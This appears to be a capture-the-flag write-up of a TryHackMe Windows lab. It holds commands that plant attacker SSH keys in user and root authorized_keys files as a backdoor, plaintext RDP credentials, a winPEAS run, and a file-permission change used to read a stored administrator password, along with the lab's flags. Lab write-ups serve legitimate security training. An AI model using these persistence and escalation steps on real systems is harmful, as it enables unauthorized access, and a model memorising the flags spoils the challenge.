### New Usable SSH Pub Keys

> add to ~/.ssh/authorized_keys


User
```
echo -e "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDcYoYj0t5vEOQuBbXFFSzqoM8JGXkJQqUJ6zo+LDQcuDHUARP8jjUlKZDjfQ2Ox4M/LQbEKZtETBdG4AniUUFPCnJFHFyFtAqvxToePdxpVj8ACG/3O+Bp4b6rhzSLqkVZ4VBesx4fTzJALkuplADrLe7vQk3oGlxc0AVZqrHuyl8GxXAoQWqy0vy0pQZM30NJikvAtR8aH233N0NNBwE3HbxPEKbkfsXX4KSjwsgCTm4MILS2XZuxN0A/5mzggXCGZC0xa+4w0m4Mv3HB+uId28lRESEpzfQO5AIPYJN6mLj5gx5pbcUgn+TqVoDyYZ7QLtl/7CPGuR2gSKj5MzlfU8EnRAzg3CYq56EE+KrshbNntUru43z1Ufh1lhldtpSbms0Zpn0r+YoIlAMOo2+ImT6hamVT+2sIBvq49ROHpiLq5STqiouM3hnLF802SqikYknPZ/jrCk0tCdotqt7UQEa7ez7g4BkXwM0YQ06evd5E96moXOViRjCQ6Vn9wEhZmGB1r5I1HJ5IfLEVrbukiyophktp5wO2+W9NKoHfwqC/y1POMICzJ/DWLTmB03WsulmY18XKiDn2nf81FPklJS5SnyRij2G8M5wA/hrY3MtnTAXJ+v8nBKMCQyy723NFAs9BZChwHb7FaGKRV7nrz6htpVkcmlePQlUsgtXLtQ== your_email@example.com" >> /home/user/.ssh/authorized_keys

```

Root
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCt0T8tWppRBW87fXkf9iDZGL4RONp5i0jgICcK5hJX4ksZVW9jaWCxa+2UVS7iIII9mdblcJPBpmQyS+1JYw9UU2GVZlCbr3jRjupkSd5OV3fvXGZCkS51vpZ88fXgSu0cwqvygVD7hHSwz1kU/VIm50+vnrfhzbH9AGQreLKKS8it+Qer4j2AS8pJoCXk05LdQWWOcLu8hOmbSrORpSzN48j+aYUPdklPncXHuwFxvCeWUn/8E0E/N7BRCfKIiJyuYkAWfoJofIWH0klo6+I85w5TWTB9ayIQkOj0O00POlDu7LSUIL5AK9cMVzhMH/PJhlq7YD6Lt3H3zel4DIseayJIPE/TxSlUnvSLk6Jrw4BFCsv1qsznn5toAhc4ruE7GukH+U54t4EIDdICLY3I+v4VnOWlHbY0iz+d5Zmt6Z7IHZrLjW7OlJk6woNDXWuQ0xGss7xMXgrc1IUIp5/iE3Mg6yulJBTnMGhvQ8JH+1i2og+E/l4J/bduSrDe0tYEMcyFsMUVo77VvC9krwvstYG9HaEvPpuQc5J+ik/sOcLxIg6t1LmuUp483Oh3NhReoclF4NaD/TRI0OByCPRgKQsIiYxZxO6SM7vHVyYmgSu/hMj6OY/X/Pa4MZgA5fw4j6CcDzghty5JF5tuYm2BQvjLTDVkyu3oP1bms3MRlQ== your_email@example.com" >> /root/.ssh/authorized_keys
```

just use the credentials for remote desktop...

```
rdesktop -u SG -p UmbracoIsTheBest! 10.10.206.242
```

C:\Users\SG\user.txt
```
THM{N00T_NO0T}
```

Literally copy and paste the contents of the winpeas bat file into winpeas.bat in the user documetns folder.

[winpeas](https://github.com/peass-ng/PEASS-ng/releases/download/20241011-f83883c6/winPEAS.bat)

```
C:\Users\SG\Documents\winpeas.bat | tee -filepath C:\Users\SG\winlog.txt
```

winpeas turned into a headache on this machine, turns out jsut follow the hints from THM

hidden folder

```
C:\backup
```

restore.txt - can't read it but we can change permissions

1. right click
2. properties
3. security
4. edit
5. add
6. Enter the following into "Enter object names to select"
```
WIN-LU09299160F\SG
```
7. ok
8. apply
9. ok
10. ok

C:\backup\restore.txt

```
ChangeMeBaby1MoreTime
```

looks like the admin password THM hinted at

```
Administrator
ChangeMeBaby1MoreTime
```

```
rdesktop -u Administrator -p ChangeMeBaby1MoreTime 10.10.206.242
```


C:\Users\Administrator\root.txt

```
THM{Y0U_4R3_1337}
```

